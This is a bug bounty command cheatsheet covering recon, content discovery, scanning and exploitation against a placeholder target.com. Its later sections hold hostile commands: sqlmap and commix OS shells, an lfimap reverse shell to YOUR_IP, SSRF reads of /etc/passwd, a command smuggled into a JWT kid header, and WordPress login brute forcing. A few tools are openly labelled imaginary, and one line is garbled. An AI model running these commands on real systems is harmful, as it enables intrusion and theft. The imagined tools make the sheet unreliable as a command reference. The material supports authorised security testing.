##
### ULTIMATE BUG BOUNTY COMMAND CHEATSHEET (Expanded Edition)
### Organized by workflow with detailed explanations and variations
##

## INITIAL RECONNAISSANCE & TARGET MAPPING

### Passive Subdomain Enumeration (Leveraging multiple sources and options)    
    :- Basic passive scan
    subfinder -d target.com -o subfinder_passive.txt
    
    :- Use all passive sources
    subfinder -d target.com -all -o subfinder_all_sources.txt
    
    :- Use specific sources
    subfinder -d target.com -sources virustotal,crtsh,bufferover -o subfinder_specific_sources.txt 
    
    :- Set rate limit for requests
    subfinder -d target.com -rl 100 -o subfinder_rate_limited.txt
    
    :- Silent mode, only output subdomains
    subfinder -d target.com -silent -o subfinder_silent.txt
    
    :- Use custom config for API keys
    subfinder -d target.com -config /path/to/config.yaml -o subfinder_custom_config.txt 
    
    :- Perform recursive subdomain enumeration
    subfinder -d target.com -recursive -o subfinder_recursive.txt
    
    :- Set number of threads
    subfinder -d target.com -t 50 -o subfinder_threaded.txt

    
    :- Comprehensive passive enum
    amass enum -passive -d target.com -o amass_passive.txt
    
    :- With API keys
    amass enum -passive -d target.com -config /path/to/amass_config.ini -o amass_passive_config.txt 
    
    :- Show sources for found subdomains
    amass enum -passive -d target.com -src -o amass_passive_sources.txt
    
    :- Specify network interface
    amass enum -passive -d target.com -iface eth0 -o amass_passive_iface.txt
    
    :- Output in JSON format
    amass enum -passive -d target.com -json amass_passive.json
    
    :- Enumerate multiple domains
    amass enum -passive -d target.com -d anotherdomain.com -o amass_multi_domain.txt 

    
    :- Fast subdomain discovery
    findomain -t target.com -u findomain_results.txt
    
    :- Resolve found subdomains
    findomain -t target.com -r -u findomain_resolved.txt
    
    :- Set number of threads
    findomain -t target.com --threads 10 -u findomain_threads.txt
    
    :- Exclude specific sources
    findomain -t target.com --exclude-sources spyse,virustotal -u findomain_exclude.txt 
    
    :- Set rate limit in milliseconds
    findomain -t target.com --rate-limit 500 -u findomain_rate.txt

    
    :- Simple subdomain finder
    assetfinder --subs-only target.com | anew assets_subs_only.txt
    
    :- Grep for target's subdomains
    assetfinder target.com | grep ".target.com" | anew assets_grep.txt

    
    :- HackerOne's Chaos dataset
    chaos -d target.com -key $CHAOS_KEY -o chaos_output.txt
    
    :- Silent output
    chaos -d target.com -key $CHAOS_KEY -silent -o chaos_silent.txt
    
    :- JSON output
    chaos -d target.com -key $CHAOS_KEY -json -o chaos_output.json
    
    :- Output count of subdomains
    chaos -d target.com -key $CHAOS_KEY -count -o chaos_count.txt

    
    :- Find subdomains via GitHub
    github-subdomains -d target.com -t $GITHUB_TOKEN -o github_subs.txt
    
    :- Raw output from GitHub search
    github-subdomains -d target.com -t $GITHUB_TOKEN -raw -o github_subs_raw.txt 

    
    :- Manual crt.sh query
    curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crtsh_subs.txt 

### Active Subdomain Enumeration (Brute force and DNS record checking)    
    :- Active DNS brute forcing
    amass enum -active -d target.com -brute -w common_subdomains.txt -o amass_active_brute.txt 
    
    :- Custom resolvers and wordlist
    amass enum -active -d target.com -brute -rf resolvers.txt -w wordlist.txt -o amass_active_custom.txt 
    
    :- Check specific ports during active enum
    amass enum -active -d target.com -p 80,443,8080 -o amass_active_ports.txt

    
    :- Fast threaded brute force
    gobuster dns -d target.com -w subdomains_small.txt -t 50 -o gobuster_dns_small.txt 
    
    :- Show IPs
    gobuster dns -d target.com -w subdomains_large.txt -t 100 -i -o gobuster_dns_large_ips.txt 
    
    :- Force wildcard detection
    gobuster dns -d target.com -w subdomains.txt --wildcard -o gobuster_dns_wildcard.txt 
    
    :- Specify resolver
    gobuster dns -d target.com -w subdomains.txt -r 8.8.8.8 -o gobuster_dns_resolver.txt 

    
    :- MassDNS wrapper for brute force
    shuffledns -d target.com -w wordlist.txt -r resolvers.txt -o shuffledns_output.txt 
    
    :- Resolve a list of subdomains
    shuffledns -d target.com -list subs_to_resolve.txt -r resolvers.txt -o shuffledns_resolve.txt 
    
    :- Specify massdns binary
    shuffledns -d target.com -w wordlist.txt -r resolvers.txt -massdns /path/to/massdns -o shuffledns_custom_massdns.txt 

    
    :- PureDNS for brute forcing
    puredns bruteforce wordlist.txt target.com -r resolvers.txt -w puredns_brute.txt 
    
    :- PureDNS for resolving
    puredns resolve subs.txt -r resolvers.txt -w puredns_resolved.txt

### DNS Reconnaissance (Gathering various DNS record types)    
    :- Comprehensive DNS query
    dnsx -l subdomains.txt -a -aaaa -cname -mx -txt -ptr -ns -soa -resp -o dns_records_full.json 
    
    :- Get A records
    dnsx -l subdomains.txt -t A -o dns_a_records.txt
    
    :- Get CNAME records
    dnsx -l subdomains.txt -t CNAME -o dns_cname_records.txt
    
    :- Get MX records
    dnsx -l subdomains.txt -t MX -o dns_mx_records.txt
    
    :- Get TXT records (check for SPF, DKIM, DMARC)
    dnsx -l subdomains.txt -t TXT -o dns_txt_records.txt
    
    :- Use custom resolvers
    dnsx -l subdomains.txt -r resolvers.txt -o dns_custom_resolvers.txt
    
    :- Show only resolved IPs
    dnsx -l subdomains.txt -resp -o dns_resolved_ips.txt
    
    :- Output in JSON
    dnsx -l subdomains.txt -json -o dns_records.json
    
    :- Filter out wildcard subdomains for target.com
    dnsx -l subdomains.txt -wd target.com -o dns_wildcard_filtered.txt

    
    :- Query ANY record for a domain
    dig target.com ANY +noall +answer
    
    :- Query MX records (short format)
    dig target.com MX +short
    
    :- Query TXT records
    dig target.com TXT
    
    :- Attempt Zone Transfer from ns1
    dig axfr target.com @ns1.target.com
    
    :- Reverse DNS lookup
    dig -x 192.168.1.1

    
    :- Simple A, AAAA, MX lookup
    host target.com
    
    :- Lookup CNAME
    host -t CNAME www.target.com
    
    :- Lookup SOA record
    host -t SOA target.com

    
    :- Semi-active DNS reconnaissance with a list
    fierce --domain target.com --subdomains subs.txt --threads 10
    
    :- Perform wider search, traverse N near IPs
    fierce --domain target.com --wide --traverse 5

    
    :- Standard enumeration (A, MX, NS, SOA)
    dnsrecon -d target.com -t std -o dnsrecon_std.txt
    
    :- Enumerate SRV records
    dnsrecon -d target.com -t srv -o dnsrecon_srv.txt
    
    :- Attempt AXFR
    dnsrecon -d target.com -t axfr -o dnsrecon_axfr.txt
    
    :- Brute force subdomains
    dnsrecon -d target.com -t brt -D subdomains_wordlist.txt -o dnsrecon_brute.txt 
    
    :- Perform a NSEC/NSEC3 zone walk (if applicable)
    dnsrecon -d target.com -t zonewalk -o dnsrecon_zonewalk.txt

### Cloud Infrastructure Identification (AWS, Azure, GCP, and others)    
    :- Enumerate common cloud services for 'target' keyword
    cloud_enum -k target -o cloud_enum_all.log
    
    :- Enumerate only AWS for target.com
    cloud_enum -k target.com -t aws -o cloud_enum_aws.log
    
    :- Enumerate Azure for company name
    cloud_enum -k "companyname" -t azure -o cloud_enum_azure_company.log
    
    :- Enumerate GCP for project ID
    cloud_enum -k "project-id" -t gcp -o cloud_enum_gcp_project.log
    
    :- Check S3 buckets from a file
    cloud_enum -kf s3_bucket_list.txt -t aws -o cloud_enum_s3_from_file.log

    
    :- Find open S3 buckets from a list
    s3scanner scan -l buckets.txt -o s3_open_buckets.json
    
    :- Scan a specific S3 bucket
    s3scanner scan --bucket mybucketname -o s3_specific_bucket.json
    
    :- Check all S3 permissions
    s3scanner scan -l buckets.txt --all-perms -o s3_all_perms.json

    
    :- GCP storage brute force with keyword
    gcpbucketbrute -k target -w common_gcp_words.txt -o gcp_buckets.txt
    
    :- GCP storage brute force using domain name permutations
    gcpbucketbrute -d target.com -o gcp_buckets_domain.txt

### ASN and IP Range Discovery    
    :- Find ASNs via organization name
    amass intel -org "Target Company LLC" -whois -o asns_org.txt
    
    :- Find IPs for a given ASN
    amass intel -asn 12345 -o ips_for_asn.txt
    
    :- Reverse Whois for CIDR
    amass intel -cidr 192.168.0.0/16 -o reverse_whois_cidr.txt
    
    :- Visualize amass results (requires DB)
    amass viz -d3 -enum amass_db/amass.sqlite

    
    :- Get info for ASN 12345
    whois AS12345
    
    :- Get IP ranges for ASN from RADB
    whois -h whois.radb.net -- '-i origin AS12345' | grep "route:"
    
    :- Get Whois info for a domain
    whois target.com
    
    :- Get Whois info for an IP
    whois 1.2.3.4

    
    :- Use Nmap to query ASN (no port scan)
    nmap --script asn-query --script-args asn=AS12345 -sn

    
    :- Get prefixes for an ASN via BGPView API
    curl -s "https://api.bgpview.io/asn/12345/prefixes" | jq .
    
    :- Get ASN details from ipinfo.io
    curl -s "https://ipinfo.io/AS12345/json" | jq .

### Technology Fingerprinting    
    :- Verbose fingerprinting, aggression level 3
    whatweb https://target.com -v -a 3
    
    :- Fingerprint list of URLs, set User-Agent, log to XML
    whatweb -i subdomains_live.txt -U "Mozilla/5.0" --log-xml tech_report.xml
    
    :- No color, suppress errors
    whatweb https://target.com --color=never --no-errors
    
    :- Run specific plugins
    whatweb https://target.com --plugins=Apache,PHP,WordPress

    
    :- Fingerprint web technologies (alternative to WhatWeb)
    webanalyze -host https://target.com -output webanalyze_output.json
    
    :- Crawl and analyze multiple hosts
    webanalyze -hosts live_hosts.txt -crawl 1 -output webanalyze_crawled.json

    
    :- Tech detection with httpx, also grab status and title
    httpx -l live_urls.txt -tech-detect -status-code -title -o httpx_tech.txt

## WEB DISCOVERY & CONTENT CRAWLING

### URL Discovery from Multiple Sources    
    :- Fetch from AlienVault, CommonCrawl, etc., including subdomains
    gau target.com --subs --threads 20 --o gau_urls.txt
    
    :- Use specific providers
    gau target.com --subs --providers wayback,commoncrawl,otx -o gau_specific_sources.txt 
    
    :- Blacklist specific extensions
    gau target.com --subs --blacklist .jpg,.png,.css --o gau_filtered.txt
    
    :- Output in JSON format
    gau target.com --subs --json -o gau_urls.json
    
    :- Read domains from stdin
    gau --stdin < list_of_domains.txt --o gau_from_list.txt

    
    :- Initial Wayback Machine scrape
    waybackurls target.com | anew wayback_initial.txt
    
    :- Get URLs from specific year range
    waybackurls target.com --dates 2020-2022 | anew wayback_dated.txt
    
    :- Get all versions of URLs
    waybackurls target.com --get-versions | anew wayback_versions.txt
    
    :- Filter for JavaScript files
    waybackurls target.com | grep "\.js$" | anew wayback_js.txt
    
    :- Filter for PHP files
    waybackurls target.com | grep "\.php" | anew wayback_php.txt

    
    :- Crawl depth 3, parse JS, known files
    katana -u https://target.com -d 3 -jc -kf -o katana_depth3.txt
    
    :- Crawl depth 5, JS crawl, 10 concurrency
    katana -u https://target.com -d 5 -jsl -c 10 -o katana_js_crawl.txt
    
    :- Crawl a list of URLs, output only queryable URLs
    katana -list list_of_urls.txt -f qurl -o katana_list_crawl.txt
    
    :- Crawl with custom header (e.g., auth cookie)
    katana -u https://target.com -H "Cookie: session=xyz" -o katana_auth_crawl.txt 
    
    :- Exclude static file extensions
    katana -u https://target.com -ef woff,css,png,jpg,svg -o katana_no_static.txt 
    
    :- Only include specific dynamic extensions
    katana -u https://target.com -aff ".php,.aspx,.jsp" -o katana_specific_ext.txt 

    
    :- Depth 3, include subdomains, unique URLs, 10 threads
    hakrawler -url https://target.com -d 3 -subs -u -t 10 -o hakrawler_d3.txt
    
    :- Depth 1, plain output (no colors)
    hakrawler -url https://target.com -d 1 -plain -o hakrawler_plain.txt
    
    :- Allow insecure HTTPS connections
    hakrawler -url https://target.com -d 2 -insecure -o hakrawler_insecure.txt

    
    :- Site, depth 2, 10 threads, 5 concurrent
    gospider -s https://target.com -d 2 -t 10 -c 5 -o gospider_d2.txt
    
    :- Spider list of sites, depth 1, parse JS for URLs
    gospider -S list_of_sites.txt -d 1 --js -o gospider_js_parsed.txt
    
    :- Respect robots.txt
    gospider -s https://target.com --robots -o gospider_robots.txt
    
    :- Find URLs from other sources (JS, Wayback)
    gospider -s https://target.com --other-source -o gospider_other_sources.txt 
    
    :- Include custom header
    gospider -s https://target.com -H "X-Custom-Header: value" -o gospider_custom_header.txt 
    
    :- Blacklist extensions
    gospider -s https://target.com --blacklist ".(jpg|png|css)$" -o gospider_blacklist.txt 

### Parameter Discovery    
    :- Smart parameter brute forcer for a single endpoint
    arjun -u https://target.com/api/endpoint -o arjun_params.json
    
    :- Find GET parameters
    arjun -u https://target.com/api/endpoint -m GET -o arjun_get_params.json
    
    :- Find POST parameters
    arjun -u https://target.com/api/endpoint -m POST -o arjun_post_params.json
    
    :- Find JSON parameters
    arjun -u https://target.com/api/endpoint -m JSON -o arjun_json_params.json
    
    :- Find hidden params in a list of URLs
    arjun -i urls_with_params.txt -o arjun_from_list.json
    
    :- Use custom wordlist
    arjun -u https://target.com -w custom_params.txt -o arjun_custom_wordlist.txt 

    
    :- Mine parameters from archives (high level of uncommon params)
    paramspider -d target.com -l high -o paramspider_high.txt
    
    :- Mine parameters (low level - common params)
    paramspider -d target.com -l low -o paramspider_low.txt
    
    :- Exclude certain file extensions
    paramspider -d target.com --exclude jpg,png,css -o paramspider_filtered.txt 
    
    :- Include subdomains
    paramspider -d target.com -s -o paramspider_with_subs.txt
    
    :- Use custom parameter wordlist
    paramspider -d target.com -p custom_wordlist.txt -o paramspider_custom.txt

### Directory/File Brute Forcing (Content Discovery)    
    :- Fast directory fuzzer
    ffuf -w common_dirs.txt -u https://target.com/FUZZ -t 100 -o ffuf_dirs.json 
    
    :- Fuzz PHP files, match 200/301
    ffuf -w files_php.txt -u https://target.com/FUZZ.php -t 100 -mc 200,301 -o ffuf_php.json 
    
    :- Recursive fuzzing
    ffuf -w wordlist.txt -u https://target.com/FUZZ -recursion -recursion-depth 2 -o ffuf_recursive.json 
    
    :- Fuzz with custom header
    ffuf -w wordlist.txt -u https://target.com/FUZZ -H "X-Forwarded-For: 127.0.0.1" -o ffuf_header.json 
    
    :- Fuzz POST requests
    ffuf -w wordlist.txt -u https://target.com/FUZZ -X POST -d "param=value" -o ffuf_post.json 
    
    :- Fuzz with extensions
    ffuf -w wordlist.txt -u https://target.com/FUZZ -e .php,.html,.txt -o ffuf_extensions.json 
    
    :- Filter by response size
    ffuf -w wordlist.txt -u https://target.com/FUZZ -fs 1234 -o ffuf_filter_size.json 
    
    :- Filter by response lines
    ffuf -w wordlist.txt -u https://target.com/FUZZ -fl 10 -o ffuf_filter_lines.json 
    
    :- Filter by regex in response
    ffuf -w wordlist.txt -u https://target.com/FUZZ -fr "/error/i" -o ffuf_filter_regex.json 

    
    :- Recursive, common extensions
    feroxbuster -u https://target.com -w big_wordlist.txt -t 20 -x php,html -o ferox_common.txt 
    
    :- Depth 3, extract links
    feroxbuster -u https://target.com -w wordlist.txt -d 3 --extract-links -o ferox_extract.txt 
    
    :- With auth header
    feroxbuster -u https://target.com -w wordlist.txt -H "Authorization: Bearer TOKEN" -o ferox_auth.txt 
    
    :- Read URLs from stdin
    feroxbuster -u https://target.com -w wordlist.txt --stdin < list_of_urls.txt -o ferox_stdin.txt 
    
    :- Disable TLS verification
    feroxbuster -u https://target.com -w wordlist.txt -k -o ferox_insecure.txt 
    
    :- Filter by status codes
    feroxbuster -u https://target.com -w wordlist.txt --status-codes 200 302 403 -o ferox_status.txt 

    
    :- Classic directory search with extensions
    dirsearch -u https://target.com -e php,asp,aspx,jsp,html,txt -t 50 -o dirsearch_ext.txt 
    
    :- Search backup files on list of URLs
    dirsearch -L list_of_urls.txt -e conf,log,bak,zip -t 30 -o dirsearch_list_backup.txt 
    
    :- Use custom wordlist
    dirsearch -u https://target.com -w /path/to/custom_wordlist.txt -o dirsearch_custom_wl.txt 
    
    :- Recursive (depth 2), exclude statuses
    dirsearch -u https://target.com -r -R 2 --exclude-status 404,500 -o dirsearch_recursive.txt 
    
    :- Use random user agent
    dirsearch -u https://target.com --random-agent -o dirsearch_random_agent.txt 

    
    :- Simple and effective
    gobuster dir -u https://target.com -w common_wordlist.txt -x php,html,js -t 50 -o gobuster_dir.txt 
    
    :- Specific status codes, insecure
    gobuster dir -u https://target.com -w wordlist.txt -s "200,204,301,302,307" -k -o gobuster_dir_status.txt 
    
    :- With cookie
    gobuster dir -u https://target.com -w wordlist.txt -c "session=foobar" -o gobuster_dir_cookie.txt 
    
    :- Basic auth
    gobuster dir -u https://target.com -w wordlist.txt -U admin -P password123 -o gobuster_dir_auth.txt 

    
    :- Flexible web fuzzer, hide 404s
    wfuzz -c -z file,wordlist.txt --hc 404 https://target.com/FUZZ
    
    :- Fuzz with extensions
    wfuzz -c -z file,wordlist.txt -z list,php-html-txt --hc 404 https://target.com/FUZZ.FUZ2Z 
    
    :- Fuzz POST data
    wfuzz -c -z file,wordlist.txt -d "user=FUZZ&pass=FUZZ" --hc 404 https://target.com/login 
    
    :- Custom User-Agent, hide 302/404
    wfuzz -c -z file,wordlist.txt -H "User-Agent: FuzzerAgent" --hc 302,404 https://target.com/FUZZ 
    
    :- Fuzz numeric range
    wfuzz -c -z range,1-100 --hc 404 https://target.com/item_id=FUZZ

### JavaScript Analysis    
    :- Extract endpoints from a single JS file
    linkfinder -i https://target.com/main.js -o linkfinder_endpoints.txt
    
    :- Discover and analyze JS files from a domain
    linkfinder -i https://target.com/ -d -o linkfinder_discovered_js.txt
    
    :- Regex for specific paths
    linkfinder -i 'https://target.com/*.js' -r '^/api/v[1-3]' -o linkfinder_api_regex.txt 
    
    :- Analyze a list of JS files
    linkfinder -i js_files_list.txt -o linkfinder_from_list.txt

    
    :- Find API keys/tokens in JS file
    secretfinder -i script.js -o secrets_found.json
    
    :- Scan all JS files in a folder
    secretfinder -i /path/to/js_folder/ -o secrets_from_folder.json
    
    :- Use custom regex patterns
    secretfinder -i script.js -g "AWS_ACCESS_KEY|GOOGLE_API_KEY" -o secrets_custom_regex.json 

    
    :- Download all JS files from a URL
    getjs --url https://target.com --output js_files_output/
    
    :- Download JS from a list of URLs
    getjs --list list_of_urls.txt --threads 5 --output js_batch_dl/
    
    :- Verbose output
    getjs --url https://target.com --verbose --output js_verbose_dl/

    
    :- Find JavaScript files on live subdomains of target.com
    subjs -u https://target.com -o subjs_live_urls.txt
    
    :- Find JS on a list of domains
    subjs -i list_of_domains.txt -o subjs_from_list.txt
    
    :- Custom concurrency, timeout, protocol
    subjs -c 10 -t 5 -p https -o subjs_custom_settings.txt

    
    :- Scan JS for vulnerable libraries
    retire -j -p /path/to/js_code/ --outputformat json --outputfile retire_report.json 
    
    :- Scan a list of JS files
    retire -n --jsrepo my_js_files.txt --outputpath retire_output.txt

### Screenshotting and Visual Recon    
    :- Screenshot a list of URLs
    gowitness file -f live_urls.txt -P screenshots/
    
    :- Screenshot from Nmap XML
    gowitness nmap -f nmap_scan.xml -P nmap_screenshots/
    
    :- Screenshot a single URL
    gowitness single https://target.com/admin -o admin_panel.png
    
    :- Custom delay and resolution
    gowitness file -f urls.txt --delay 5 --resolution "1280x1024" -P screenshots_custom/ 

    
    :- Screenshot and basic port scan on subdomains
    aquatone -ports large < live_subdomains.txt
    
    :- Larger scan
    aquatone -scan-timeout 1000 -ports xlarge -threads 25 < domains.txt -out aqua_report/ 

    
    :- Take screenshots with httpx and store in directory
    httpx -l urls.txt -ss -srd screenshots_httpx/ -silent
    
    :- Capture first 5000 bytes of screenshot
    httpx -l urls.txt -screenshot-bytes 5000 -srd screenshots_small/

## VULNERABILITY SCANNING & INITIAL EXPLOITATION

### Automated Vulnerability Scanning    
    :- Fast template-based scanner
    nuclei -u https://target.com -t nuclei-templates/ -severity critical,high -o nuclei_report.txt 
    
    :- Scan list for CVEs/Exposures, exclude tags
    nuclei -list list_of_urls.txt -t cves/,exposures/ -etags "xss,sqli" -o nuclei_cve_exposure.txt 
    
    :- Scan with custom header
    nuclei -u https://target.com -t nuclei-templates/ -H "Cookie: session=123" -o nuclei_auth.txt 
    
    :- Automatic template selection based on tech
    nuclei -u https://target.com -t technologies/ -as -o nuclei_tech_auto.txt
    
    :- Specific template category
    nuclei -u https://target.com -t exposures/misconfigurations/ -o nuclei_misconfigs.txt 
    
    :- Filter templates by tags (WordPress, Joomla)
    nuclei -u https://target.com -tags "wp,joomla" -o nuclei_cms.txt
    
    :- Validate templates before running
    nuclei -u https://target.com -validate -o nuclei_validate.txt
    
    :- Update nuclei templates
    nuclei -update-templates
    
    :- Rate limit requests and concurrency
    nuclei -u https://target.com -rl 10 -c 5 -o nuclei_rate_limit.txt

    
    :- Classic web server scanner, XML output
    nikto -h https://target.com -output nikto_report.xml -Format xml
    
    :- Specific tuning options (e.g., file upload, interesting files, misconfigs)
    nikto -h https://target.com -Tuning 123b -o nikto_tuning.txt
    
    :- Auto-enable interesting plugins
    nikto -h https://target.com -ask auto -o nikto_auto_plugins.txt
    
    :- Run specific plugins
    nikto -h https://target.com -Plugins "apacheusers;cgi" -o nikto_specific_plugins.txt 
    
    :- Scan through a proxy
    nikto -h https://target.com -useproxy http://localhost:8080 -o nikto_proxy.txt 

    
    :- Web vulnerability scanner, HTML report
    wapiti -u https://target.com -f html -o wapiti_report.html
    
    :- Specify modules to run/skip
    wapiti -u https://target.com -m "-all,+xss,+sqli,-csrf" -o wapiti_modules.txt 
    
    :- Limit scope to domain
    wapiti -u https://target.com --scope domain -o wapiti_scope_domain.txt

### SSL/TLS Configuration Checks    
    :- Comprehensive SSL/TLS checks
    testssl.sh https://target.com
    
    :- Quiet mode, HTML output
    testssl.sh --quiet --htmlfile report.html https://target.com
    
    :- Run all checks (each flag is a check group)
    testssl.sh -e -E -f -U -S -P -Q https://target.com
    
    :- Check supported protocols
    testssl.sh --protocols https://target.com
    
    :- Check ciphers per protocol
    testssl.sh --cipher-per-proto https://target.com
    
    :- Show details for each cipher
    testssl.sh --show-each-cipher https://target.com
    
    :- SSLyze for SSL/TLS scanning
    sslyze --regular target.com:443

### CMS Specific Scanning    
    :- WordPress: Enumerate vulnerable plugins/themes, users etc.
    wpscan --url https://wordpress-site.com --enumerate vp,vt,tt,cb,dbe -o wpscan_enum.txt 
    
    :- With API token
    wpscan --url https://wp.com --api-token YOUR_WPSCAN_API_TOKEN --random-user-agent -o wpscan_api.txt 
    
    :- Enumerate users, aggressive plugin detection
    wpscan --url https://wp.com -e u --plugins-detection aggressive -o wpscan_aggressive.txt 
    
    :- Brute force login
    wpscan --url https://wp.com --passwords rockyou.txt --usernames admin,editor -o wpscan_brute.txt 

    
    :- Joomla vulnerability scanner, enumerate components
    joomscan --url https://joomla-site.com -ec -o joomscan_report.txt
    
    :- Drupal scanner, enumerate all, 20 threads
    droopescan scan drupal -u https://drupal-site.com -e a -t 20 -o droopescan_report.txt 

### XSS (Cross-Site Scripting) Testing    
    :- Automated XSS with blind payload
    dalfox url 'https://target.com/search?q=FUZZ' -b your.burpcollaborator.net -o dalfox_basic.txt 
    
    :- Scan URLs from file, skip basic auth vuln
    dalfox file list_of_urls_with_params.txt --skip-bav -o dalfox_from_file.txt 
    
    :- Test POST request
    dalfox url 'https://target.com/page' --data 'param1=test&param2=FUZZ' -X POST -o dalfox_post.txt 
    
    :- Use custom payloads
    dalfox url 'https://target.com/reflect' --custom-payload xss_payloads.txt -o dalfox_custom.txt 
    
    :- DOM XSS mining
    dalfox url 'https://target.com' --mining-dom --deep-domxss -o dalfox_dom.txt 
    
    :- Attempt WAF evasion techniques
    dalfox url 'https://target.com' --waf-evasion -o dalfox_waf.txt

    
    :- Crawl and test, provide seeds
    xsstrike -u "https://target.com/search?q=test" --crawl -t 10 -l 3 --seeds seeds.txt -o xsstrike_crawl.html 
    
    :- Custom payloads and headers
    xsstrike -u "https://target.com/input?val=1" -f /path/to/payloads.txt --headers "Cookie: SESSID=123" 
    
    :- Test JSON input in POST body, path discovery
    xsstrike -u "https://target.com/api" --json --path -d '{"key":"FUZZ"}' -o xsstrike_json.html 

    
    :- Simple Reflected XSS scanner
    kxss 'https://target.com/index.php?p=FUZZ'
    
    :- Pipe URL and set custom parameters like cookies
    echo 'https://target.com/q=FUZZ' | kxss -p 'Cookie: test=kXSS'

### SQL Injection Testing    
    :- Automated SQLi, enumerate databases
    sqlmap -u "https://target.com/product?id=1" --batch --level 3 --risk 2 --dbs 
    
    :- Test POST request, 5 threads
    sqlmap -u "https://target.com/search.php" --data="query=keyword" --dbs --threads 5 
    
    :- Specify parameter, use tamper script, get current user
    sqlmap -u "https://target.com/user?id=1" -p id --tamper=space2comment --random-agent --current-user 
    
    :- Load request from file, attempt OS shell
    sqlmap -l request.txt --level 5 --risk 3 --os-shell
    
    :- Specify DBMS, get banner
    sqlmap -u "https://target.com/vuln.php?id=1&cat=2" --dbms=MySQL --banner
    
    :- Test forms found by crawling
    sqlmap -u "https://target.com/login" --forms --crawl=2 --batch

:- Load raw HTTP request, specify parameter, use specific techniques (boolean, error, union, stacked, time-based, inline), 

    :-ump data
    sqlmap -r post_request.txt -p username --technique=BEUSQ --dump
    
    :- Manual injection point with eval for dynamic payloads
    sqlmap -u "https://api.target.com/items?filter=FUZZ" --eval="import time; time.sleep(0.1)" --prefix="'" --suffix="-- -" 

    
    :- Modern SQLi scanner, list DBs
    ghauri -u "https://target.com/search.php?q=test" --dbs
    
    :- Scan from request file, specify parameter
    ghauri -r request_file.txt -p vulnerable_param --level 3 --risk 2

### SSRF (Server-Side Request Forgery) Testing    
    :- Automated SSRF exploitation on 'url' parameter
    ssrfmap -r request_for_ssrf.txt -p url -m http,gopher --lhost your_server_ip 
    
    :- Use Interactsh for OOB detection
    ssrfmap -r req.txt -p file --handler interactsh
    
    :- Attempt to read local files via SSRF
    ssrfmap -r req.txt -p u --module readfiles --lfile /etc/passwd

    
    :- Start Interactsh client for OOB interactions
    interactsh-client
    
    :- Manual SSRF test with Interactsh
    curl -X POST -d "url=http://YOUR_INTERACTSH_ID.oastify.com" https://target.com/proxy 

    
    :- Inject SSRF payloads from file and check status
    qsreplace "http://target.com/proxy?url=FUZZ" -a "ssrf_payloads.txt" | httpx -silent -status-code -mc 200 

### File Inclusion (LFI/RFI)    
    :- Test LFI and RFI, attempt reverse shell
    lfimap -u 'https://target.com/page?file=FUZZ' --rfi --lhost YOUR_IP --lport 4444 
    
    :- Heuristic-based LFI detection
    lfimap -u 'https://target.com/download?path=FUZZ' --heuristics --level 2
    
    :- Use custom LFI wordlist
    lfimap -u 'https://target.com/include.php?page=FUZZ' -w /usr/share/wordlists/wfuzz/general/lfi.txt 

    
    :- Directory traversal tool
    dotdotpwn -m http -h target.com -u "/scripts/download.php?file=TRAVERSAL" -k "root:" -o dotdotpwn_results.txt 
    
    :- Standard traversal, look for /etc/passwd
    dotdotpwn -m http -h target.com -f /etc/passwd -s

### Command Injection    
    :- Test command injection, run whoami
    commix -u "https://target.com/cmd.php?command=FUZZ" --os-cmd "whoami"
    
    :- POST based, get OS shell
    commix --url="https://target.com/exec?host=127.0.0.1" --data="host=127.0.0.1&submit=submit" -p host --os-shell 
    
    :- Test all injectable parameters from a request file
    commix -r request.txt -p param_to_inject --all

## API TESTING (REST, GraphQL, SOAP)

### REST API Testing    
    :- API endpoint brute force, 10 extensions deep
    kiterunner -w api_routes.txt -u https://target.com/api -A discovery -x 10 -o kiterunner_scan.txt 
    
    :- Scan using Kiterunner's format
    kiterunner scan -U https://api.target.com -w routes-large.kite --max-api-depth 5 -o kite_depth5.txt 
    
    :- Recon mode on a list of hosts
    kiterunner recon -A assetnote_wordlist/kiterunner/routes-large.kite -s hosts.txt -o kite_recon.txt 

### (arjun used previously for general param discovery, also applicable here)    
    :- API GET parameter discovery
    arjun -u https://api.target.com/v1/users --include='application/json' -m GET -o arjun_api_get.json 
    
    :- API POST w/ Auth
    arjun -u https://api.target.com/v1/items -m POST -H "Authorization: Bearer XYZ" -o arjun_api_post_auth.json 

### GraphQL Testing    
    :- Dump schema with auth
    graphqlmap -u https://target.com/graphql --dump-schema --headers "Auth: Bearer TKN" 
    
    :- Custom introspection query
    graphqlmap -u https://target.com/graphql --method query --query '{__schema{types{name}}}' 
    
    :- Schema reconstruction if introspection is disabled
    clairvoyance -o schema_reconstructed.json https://target.com/graphql
    
    :- Use wordlist and header
    clairvoyance -w wordlist_for_graphql.txt -H "X-API-KEY: mykey" https://target.com/graphql 

    
    :- Burp extension, can be used command-line for schema analysis (conceptual)
    inql -t https://target.com/graphql -f schema.json
    
    :- Fingerprint GraphQL engine and dump schema
    graphw00f -t https://target.com/graphql -f -d -o graphw00f_fingerprint.txt 
    
    :- Scan a list of endpoints
    graphw00f -list list_of_graphql_endpoints.txt -o graphw00f_list_scan.txt

### (nuclei has GraphQL templates)    
    nuclei -u https://target.com/graphql -t exposures/graphql/graphql-introspection.yaml -o nuclei_graphql_introspection.txt

## AUTHENTICATION & SESSION TESTING

### JWT (JSON Web Token) Testing    
    :- Tamper alg, change payload claim
    jwt_tool eyJhbGci... --exploit -X a -pc name -pv admin
    
    :- kid header injection for command execution
    jwt_tool eyJhbGci... --exploit -I -hc kid -hv "/dev/null;whoami"
    
    :- Sign with new key (e.g. after alg confusion)
    jwt_tool eyJhbGci... -S hs256 -k "public_key.pem"
    
    :- Verify with public key
    jwt_tool eyJhbGci... -V -pk public_key.pem
    
    :- Add new 'password' claim
    jwt_tool eyJhbGci... -A -p password
    
    :- Decode only
    jwt_tool eyJhbGci... -d

    
    :- Brute force HS256 secret
    crackjwt -t eyJhbGci... -w rockyou.txt -a HS256
    
    :- Test for weak public key in RS256 (e.g. if it's actually the private key)
    crackjwt -t eyJabc... -w wordlist.txt -a RS256 --pubkey public.pem

### OAuth Testing
    :- (Manual testing with Burp Suite is common. Tools can assist.)
    :- For conceptual command, imagine a tool:    
    
    :- Test for common misconfigs
    oauth_scanner -u https://auth.target.com/authorize -c client_id_val -r http://localhost/callback --test misconfigs 
    
    :- Test specific flow
    oauth_scanner -u https://auth.target.com/token -g client_credentials --test open_redirect 

### Session Management Testing
    :- (Often manual or with Burp Sequencer. For a command line concept:)    
    
    :- Analyze session ID entropy
    session_analyzer --url https://target.com/login --cookies "PHPSESSID=abc" --check-entropy 
    
